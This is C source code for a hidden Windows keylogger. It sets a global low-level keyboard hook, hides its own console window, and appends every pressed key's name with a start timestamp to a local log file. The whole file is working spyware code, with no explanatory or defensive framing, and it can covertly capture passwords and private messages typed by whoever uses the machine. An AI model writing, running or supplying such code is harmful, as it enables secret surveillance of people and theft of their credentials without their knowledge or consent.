#include <stdio.h>
#include <windows.h>
#include <time.h>
#define PATH "./test-log.txt" // The path to the log file

FILE *file;
char *buf;
int buflen = 10;

LRESULT HookCallback(int code, WPARAM wParam, LPARAM lParam) {
	if (code >= 0 && wParam == WM_KEYDOWN) {
		GetKeyNameTextA(((KBDLLHOOKSTRUCT *)lParam)->scanCode << 16, buf, buflen);
		fprintf(file, "%s\n", buf);
	}
	fflush(file);
	return CallNextHookEx(NULL, code, wParam, lParam);
}
int main(void) {
    // Time stuff.
    time_t t;
    t = time(NULL);
    // Hide the window
    HWND window;
    AllocConsole();
    window=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(window,0);
	buf = malloc(buflen * sizeof(char));
    file = fopen(PATH, "a+");
    fprintf(file, "\n#$Logger: Started logging @ %s", ctime(&t));
	HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, 0, 0);
	if (hook == NULL) return -1;
	MSG msg;
	while(GetMessage(&msg, NULL, 0, 0) > 0);	
	return 0;
}